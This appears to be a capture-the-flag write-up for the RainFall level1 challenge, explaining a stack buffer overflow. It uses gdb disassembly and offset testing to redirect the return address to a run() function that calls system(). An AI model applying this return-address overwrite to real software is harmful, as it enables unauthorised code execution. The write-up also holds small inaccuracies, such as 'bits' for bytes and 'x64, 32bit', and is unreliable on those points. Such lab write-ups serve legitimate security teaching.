### How to find run() function ?

By disassembling level1 executable in ghidra we have a function section that allow us to visualize all functions, and run appears here, on the left section: (ghidra_run.png)

![Ghidra result](https://github.com/kbarbry/RainFall/blob/main/level1/Resources/ghidra_run.png)

### How to find the 0x08048444 address ?

Again, we used ghidra to analyze the level0 file: (ghidra_run.png)

![Ghidra result](https://github.com/kbarbry/RainFall/blob/main/level1/Resources/ghidra_run.png)

We could also have used gdb and the disas command that gives us:
```sh
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave  
   0x0804847f <+59>:	ret    
End of assembler dump.
```

We can see the address of the first push asm instruction, which is 0x08048444.

### How to know where to place the address and in which format is the payload?

By trying again and again, we tried a payload full of A, we knew from the ghidra analysis that the buffer was 76 bits long: (ghidra_main.png)

![Ghidra result](https://github.com/kbarbry/RainFall/blob/main/level1/Resources/ghidra_main.png)

So we tried with 76, 80, 84, to see when the address was edited:

```sh
# With 76 A precisely
(gdb) run < /tmp/payload
Starting program: /home/user/level1/level1 < /tmp/payload

Program received signal SIGILL, Illegal instruction.
0xb7e45400 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6

# With 80 A
(gdb) run < /tmp/payload
Starting program: /home/user/level1/level1 < /tmp/payload

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

# Just to make sure
# With 76 A + 4 B
(gdb) run < /tmp/payload
Starting program: /home/user/level1/level1 < /tmp/payload

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

With those tests we can identify the precise location where we want to replace the return address, which are the 4 bits next to the 76 buffer.

The little endian synthax asks us to write the addresses upside down in hexadecimal shell values.

### How do we know that this address will always be the same ?

In a x64, 32bit linux architecture, the different sections of the memory are always starting at the same address, and the starting address of the code section (text) is 0x08048000 (again in this architecture).
For the same program, the offset between the declaration of the function and the beggining of the program will always be the same, therefore, the function call will always be at the same address, here 0x08048444.
